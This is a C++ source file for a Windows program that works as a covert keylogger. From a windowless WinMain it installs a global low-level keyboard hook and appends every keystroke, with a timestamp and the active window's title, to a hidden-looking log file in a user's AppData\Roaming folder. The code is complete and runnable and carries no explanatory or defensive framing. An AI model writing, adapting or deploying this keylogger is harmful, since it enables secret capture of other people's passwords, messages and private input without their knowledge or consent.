#define _WIN32_WINNT  0x1337
#define __DEBUG__
#include <fstream>
#include <windows.h>
#include <time.h>
//#include <unistd.h>

using namespace std;

HHOOK keybdHook;
char WindowInFocus[512];
char PreviousFocus[512];

LRESULT CALLBACK KeybdHookProc( int, WPARAM, LPARAM );

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{

/*	char *path = NULL;
	size_t size;
	path=getcwd(path,size);
	
	MessageBox( NULL, path, NULL, MB_OK );
*/
	
	MSG messages;
	
	keybdHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeybdHookProc, hInstance, 0 );
	
	while (GetMessage (&messages, NULL, 0, 0))
	{
		TranslateMessage(&messages);
		DispatchMessage(&messages);
	}
	
	UnhookWindowsHookEx( keybdHook );

	return messages.wParam;
}


LRESULT CALLBACK KeybdHookProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	if( wParam == WM_KEYDOWN || wParam == WM_KEYUP )
	{
		
		time_t secs = time(0);
		tm *t = localtime( &secs );
		char timestamp[200]; 
		strftime( timestamp, sizeof(timestamp), "%m/%d/%Y %H:%M:%S", t );
			
		ofstream out("C:\\Users\\hadi\\AppData\\Roaming\\Chronicle.log", ios::app);
			
		strcpy( PreviousFocus, WindowInFocus );
		GetWindowText( GetForegroundWindow(), WindowInFocus, sizeof(WindowInFocus) );
			
		if( 0 != strcmp(WindowInFocus,PreviousFocus) )
			out << endl << timestamp << ": [FOCUS=" << WindowInFocus << "]";

	
		if( wParam == WM_KEYUP )
		{
			
			switch (p->vkCode)
			{
				case 0xBE:			out << endl << timestamp << ": " <<".>";			break;
				case 0xC0:			out << endl << timestamp << ": " <<"`~";			break;
				case 0xBD:			out << endl << timestamp << ": " <<"-_";			break;
				case 0xBB:			out << endl << timestamp << ": " <<"=+";			break;
				case 0xDE:			out << endl << timestamp << ": " <<"'\"";			break;
				case 0xBA:			out << endl << timestamp << ": " <<";:";			break;
				case 0xBC:			out << endl << timestamp << ": " <<",<";			break;
				case 0xBF:			out << endl << timestamp << ": " <<"/?";			break;
				case 0xDC:			out << endl << timestamp << ": " <<"\\|";			break;
				case VK_BACK:															break;
				case VK_CAPITAL:	out << endl << timestamp << ": " <<"[CAPLOCK]";		break;
				case VK_CLEAR:		out << endl << timestamp << ": " <<"[CLEAR]";		break;
				case VK_CONTROL:	out << endl << timestamp << ": " <<"[CONTROL]";		break;
				case VK_DELETE:															break;
				case VK_DOWN:		out << endl << timestamp << ": " <<"[DOWN]";		break;
				case VK_END:		out << endl << timestamp << ": " <<"[END]";			break;
				case VK_ESCAPE:		out << endl << timestamp << ": " <<"[ESCAPE]";		break;
				case VK_F1:			out << endl << timestamp << ": " <<"[F1]";			break;
				case VK_F2:			out << endl << timestamp << ": " <<"[F2]";			break;
				case VK_F3:			out << endl << timestamp << ": " <<"[F3]";			break;
				case VK_F4:			out << endl << timestamp << ": " <<"[F4]";			break;
				case VK_F5:			out << endl << timestamp << ": " <<"[F5]";			break;
				case VK_F6:			out << endl << timestamp << ": " <<"[F6]";			break;
				case VK_F7:			out << endl << timestamp << ": " <<"[F7]";			break;
				case VK_F8:			out << endl << timestamp << ": " <<"[F8]";			break;
				case VK_F9:			out << endl << timestamp << ": " <<"[F9]";			break;
				case VK_F10:		out << endl << timestamp << ": " <<"[F10]";			break;
				case VK_F11:		out << endl << timestamp << ": " <<"[F11]";			break;
				case VK_F12:		out << endl << timestamp << ": " <<"[F12]";			break;
				case VK_HOME:		out << endl << timestamp << ": " <<"[HOME]";		break;
				case VK_INSERT:		out << endl << timestamp << ": " <<"[INSERT]";		break;
				case VK_LCONTROL:	out << endl << timestamp << ": " <<"[LCTRL]";		break;
				case VK_LEFT:		out << endl << timestamp << ": " <<"[LEFT]";		break;
				case VK_LSHIFT:		out << endl << timestamp << ": " <<"[LSHIFT]";		break;
				case VK_LWIN:		out << endl << timestamp << ": " <<"[LWIN]";		break;
				case VK_MENU:		out << endl << timestamp << ": " <<"[ALT]";			break;
				case VK_NEXT:		out << endl << timestamp << ": " <<"[PAGE DOWN]";	break;
				case VK_NUMLOCK:	out << endl << timestamp << ": " <<"[NUMLOCK]";		break;
				case VK_NUMPAD0:	out << endl << timestamp << ": " <<"[NUMPAD 0]";	break;
				case VK_NUMPAD1:	out << endl << timestamp << ": " <<"[NUMPAD 1]";	break;
				case VK_NUMPAD2:	out << endl << timestamp << ": " <<"[NUMPAD 2]";	break;
				case VK_NUMPAD3:	out << endl << timestamp << ": " <<"[NUMPAD 3]";	break;
				case VK_NUMPAD4:	out << endl << timestamp << ": " <<"[NUMPAD 4]";	break;
				case VK_NUMPAD5:	out << endl << timestamp << ": " <<"[NUMPAD 5]";	break;
				case VK_NUMPAD6:	out << endl << timestamp << ": " <<"[NUMPAD 6]";	break;
				case VK_NUMPAD7:	out << endl << timestamp << ": " <<"[NUMPAD 7]";	break;
				case VK_NUMPAD8:	out << endl << timestamp << ": " <<"[NUMPAD 8]";	break;
				case VK_NUMPAD9:	out << endl << timestamp << ": " <<"[NUMPAD 9]";	break;
				case VK_PAUSE:		out << endl << timestamp << ": " <<"[PAUSE]";		break;
				case VK_PRINT:		out << endl << timestamp << ": " <<"[PRINT]";		break;
				case VK_PRIOR:		out << endl << timestamp << ": " <<"[PAGE UP]";		break;
				case VK_RCONTROL:	out << endl << timestamp << ": " <<"[RCTRL]";		break;
				case VK_RETURN:		out << endl << timestamp << ": " <<"[ENTER]";		break;
				case VK_RIGHT:		out << endl << timestamp << ": " <<"[RIGHT]";		break;
				case VK_RSHIFT:		out << endl << timestamp << ": " <<"[RSHIFT]";		break;
				case VK_RWIN:		out << endl << timestamp << ": " <<"[RWIN]";		break;
				case VK_SELECT:		out << endl << timestamp << ": " <<"[SELECT]"; 		break;
				case VK_SHIFT:		out << endl << timestamp << ": " <<"[SHIFT]";		break;
				case VK_SPACE:		out << endl << timestamp << ": " <<"[SPACE]";		break;
				case VK_TAB:		out << endl << timestamp << ": " <<"[TAB]";			break;
				case VK_UP:			out << endl << timestamp << ": " <<"[UP]";			break;
				default:
						if( p->vkCode >= 39 && p->vkCode <= 64 )
							out << endl << timestamp << ": " <<(char)(p->vkCode);
						else if( p->vkCode > 64 && p->vkCode < 91 )
							out << endl << timestamp << ": " <<(char)(p->vkCode+32); 
						else 
							out << endl << timestamp << ": " <<"[" << p->vkCode << "]";
					break;
			}
		
		}
		else if( wParam == WM_KEYDOWN )
		{
		
			switch (p->vkCode)
			{
				case VK_BACK:		out << endl << timestamp << ": [BACKSPACE]";	break;
				case VK_DELETE:		out << endl << timestamp << ": [DEL]";			break;
			}
		
		}
	
		out.close();

	}
	
	return CallNextHookEx( NULL, nCode, wParam, lParam );
	
}

